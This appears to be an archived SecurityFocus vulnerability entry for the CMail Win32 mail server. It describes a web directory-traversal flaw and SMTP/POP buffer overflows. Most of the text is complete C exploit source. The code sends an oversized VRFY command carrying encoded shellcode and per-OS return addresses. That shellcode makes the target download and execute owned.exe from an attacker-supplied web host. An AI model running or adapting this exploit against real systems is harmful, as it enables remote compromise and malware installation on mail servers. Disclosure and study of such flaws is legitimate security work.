source: http://www.securityfocus.com/bid/281/info

A vulnerability in Computalynx's CMail allows remote malicious users to steal local files.

Compulynx's CMail is a Win32 mail server program. One of its features is allowing users to access their email with a web browser via a built-in web server.

The web server fails to check whether requested files fall outside its document tree (by using ".." in the URL). Thus attackers can retrieve files in the same drives as that on which the software resides if they know or can get it's filename.

A number of buffer overflows in the processing of SMTP and POP commands also exist. 

http://www.example.com:8002/../spool/username/mail.txt

the buffer overflow vulnerability 

#define UNIX

#ifndef UNIX
 #include <stdio.h>
 #include <fcntl.h>
 #include <winsock.h>
 #include <io.h>
 #define CLOSE _close
 #define SLEEP Sleep

#else
 #include <stdio.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <netdb.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #define CLOSE close
 #define SLEEP sleep
#endif
   
/*
   CMail Exploit by _mcp_ <pw@nacs.net>
   Sp3 return address and win32 porting by acpizer <acpizer@unseen.org>
*/


const unsigned long OFFSET = 635;
const unsigned long LENGTH = 650;
const unsigned long CODEOFFSET = 11;
  
char code[] =
"\xEB\x53\xEB\x20\x5B\xFC\x33\xC9\xB1\x82\x8B\xF3\x80\x2B\x1"
"\x43\xE2\xFA\x8B\xFB\xE8\xE9\xFF\xFF\xFF\xE8\xE4\xFF\xFF\xFF"
"\xEB\x37\x46\x58\xFF\xE0\x33\xDB\xB3\x5B\xC1\xE3\x10\x66\xBB"
"\x18\x79\x56\xFF\x13\x8B\xE8\x46\x33\xC0\x3A\x6\x75\xF9\x46"
"\x83\xC0\x1\x3A\x6\x74\xDD\x56\x55\x33\xDB\xB3\x5B\xC1\xE3"
"\x10\x66\xBB\x44\x79\xFF\x13\xAB\xEB\xDF\xEB\x4F\x33\xC9\x66"
"\x49\xC1\xC1\x2\x51\x33\xC0\x51\x50\xFF\x57\xE8\x8B\xE8\x33"
"\xC9\x51\x51\x51\x51\x51\xFF\x57\xF4\x33\xC9\x51\x51\x51\x51"
"\x56\x50\xFF\x57\xF8\x59\x57\x51\x55\x50\xFF\x57\xFC\x83\xC6"
"\x7\x33\xC9\x51\x56\xFF\x57\xDC\xFF\x37\x55\x50\x8B\xE8\xFF"
"\x57\xE0\x55\xFF\x57\xE4\x33\xC9\x51\x56\xFF\x57\xEC\xFF\x57"
"\xF0\xE8\x59\xFF\xFF\xFF\x4C\x46\x53\x4F\x46\x4D\x34\x33\x1"
"\x60\x6D\x64\x73\x66\x62\x75\x1\x60\x6D\x78\x73\x6A\x75\x66"
"\x1\x60\x6D\x64\x6D\x70\x74\x66\x1\x48\x6D\x70\x63\x62\x6D"
"\x42\x6D\x6D\x70\x64\x1\x58\x6A\x6F\x46\x79\x66\x64\x1\x46"
"\x79\x6A\x75\x51\x73\x70\x64\x66\x74\x74\x1\x2\x58\x4A\x4F"
"\x4A\x4F\x46\x55\x1\x4A\x6F\x75\x66\x73\x6F\x66\x75\x50\x71"
"\x66\x6F\x42\x1\x4A\x6F\x75\x66\x73\x6F\x66\x75\x50\x71\x66"
"\x6F\x56\x73\x6D\x42\x1\x4A\x6F\x75\x66\x73\x6F\x66\x75\x53"
"\x66\x62\x65\x47\x6A\x6D\x66\x1\x2\x69\x75\x75\x71\x3B\x30"
"\x30\x00";

    /*This is the encrypted /~pw/owned.exe we paste at the end */
char dir[] =
"\x30\x7f\x71\x78\x30\x70\x78\x6f\x66\x65\x2F\x66\x79\x66\x1";

/*

   Below is:

   add ecx, 10
   jmp ecx
  
   We use this to transfer to our code that we store before the return address on
our overflow buffer, We have to do this because there isn't near enough room
behind the return address to include the code.  If we weren't lucky enough to have
a register pointing virtually right to our code we could include a routine that
searches memory for specific dword in a specific direction relative to a
register's value then transfers control to our code located there.  The code can
also be easyly snuck in on another buffer by doing this.

*/


char controlcode[] =
"\x83\xc1\x0A\xFF\xE1";

  

unsigned int getip(char *hostname)
  {
  struct hostent *hostinfo;
  unsigned int binip;

  hostinfo = gethostbyname(hostname);

  if(!hostinfo)
    {
      printf("cant find: %s\n",hostname);
      exit(0);
    }
#ifndef UNIX
  memcpy((char  *)&binip, hostinfo -> h_addr, hostinfo -> h_length);
#else
  bcopy(hostinfo -> h_addr, (char  *)&binip, hostinfo -> h_length);
#endif
  return(binip);
  }

  
int usages(char *fname)
{
      printf("Remote Buffer Overflow exploit v1.2 by _mcp_ <pw@nacs.net>.\n");
      printf("Win32 Porting and nt sp3 address By Acpizer <acpizer@unseen.org>\n");
      printf("Usages: \n");
      printf("%s <target host> <www site> <return address>\n", fname);
      printf("win98:\n");
      printf("        <return address> = 0xBFF79243\n");
      printf("NT SP3:\n");
      printf("        <return address> = 0x77E53FC7\n");
      printf("NT SP4:\n");
      printf("        <return address> = 0x77E9A3A4\n");
      printf("Will make <target host> running CSMMail download, save, and\n");
      printf("execute http://<www site>/~pw/owned.exe\n");
  
exit(0);

}


main (int argc, char *argv[])
{
  int sock,targethost,sinlen;
  struct sockaddr_in sin;
  static unsigned char buffer[20000];
  unsigned char *ptr,*ptr2;
  unsigned long ret_addr;
  int len,x = 1;
  unsigned long rw_mem;
  
     
#ifndef UNIX
  WORD wVersionRequested;
  WSADATA wsaData;
  int err;  
  
  wVersionRequested = MAKEWORD( 2, 2 );
  err = WSAStartup( wVersionRequested, &wsaData );
  if (err != 0) exit(1);
#endif  
  if (argc < 4) usages(argv[0]);

  
  targethost = getip(argv[1]);
 

   len = strlen(argv[2]);
    if (len > 60)
     {
       printf("Bad http format!\n");
       usages(argv[0]);
     }
      
   ptr = argv[2];
   while (x <= len)
      {
        x++;
        (*ptr)++;           /*Encrypt the http ip for later parsing */
        ptr++;
      } 
 
  if( (sscanf(argv[3],"0x%x",(unsigned long *) &ret_addr)) == 0)
    {
      printf("Input error, the return address has incorrect format\n");
      exit(0);
    }
  
  
  sock = socket(AF_INET,SOCK_STREAM,0);
  
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = targethost;
  sin.sin_port = htons(25);
  sinlen = sizeof(sin);

  
  printf("Starting to create the egg\n");
  ptr = (char *)&buffer;
  strcpy(ptr,"VRFY ");
  ptr+=5;
  
  memset((void *)ptr, 0x90, 7000);
  ptr2=ptr;

  ptr2+=OFFSET;
  memcpy ((void *) ptr2,(void *)&ret_addr, 4);
  ptr2+=8;
  /* Put the code on the stack that transfers control to our code */
  memcpy((void *) ptr2, (void *)&controlcode, (sizeof(controlcode)-1) );

  ptr2=ptr;
  ptr2+=LENGTH;
  (*ptr2)=0x00;
  

  ptr+=CODEOFFSET;
  memcpy((void *) ptr,(void *)&code,strlen(code));
 

  (char *) ptr2 = strstr(ptr,"\xb1");
  if (ptr2 == NULL)
     {
       printf("Bad shell code\n");
       exit(0);
     }
  ptr2++;
  (*ptr2)+= len + ( sizeof(dir) );
      
   (char *) ptr2 = strstr(ptr,"\x83\xc6");
     if (ptr2 == NULL)
      {
        printf("Bad shell code\n");
        exit(0);
  
      }
  
  ptr2+= 2;

  (*ptr2)+= len + 8;
  
  ptr+=strlen(code);
  memcpy((void *) ptr, (void *) argv[2], len);   /*Parse in the http
  site's info */
  ptr+=len;
  memcpy((void *) ptr,(void*) &dir, (sizeof(dir)-1) );
  
  printf("Made the egg\n");
  
    if ( connect(sock, (struct sockaddr *)&sin, sinlen) == -1)
     {
       perror("error:");
       exit(0);
     }
    printf("Connected.\n");
  
#ifndef UNIX   
        send(sock, (char *)&buffer, strlen((char *)&buffer), 0);
        send(sock,"\r\n",2,0);
#else
    write(sock, &buffer, strlen((char *)&buffer) ); /* strlen((char
*)&buffer */
    write(sock,"\r\n",2);
#endif
    SLEEP(1);
    printf("Sent the egg\n");
#ifndef UNIX
  WSACleanup();
#endif
    CLOSE(sock);
   exit(1);
}     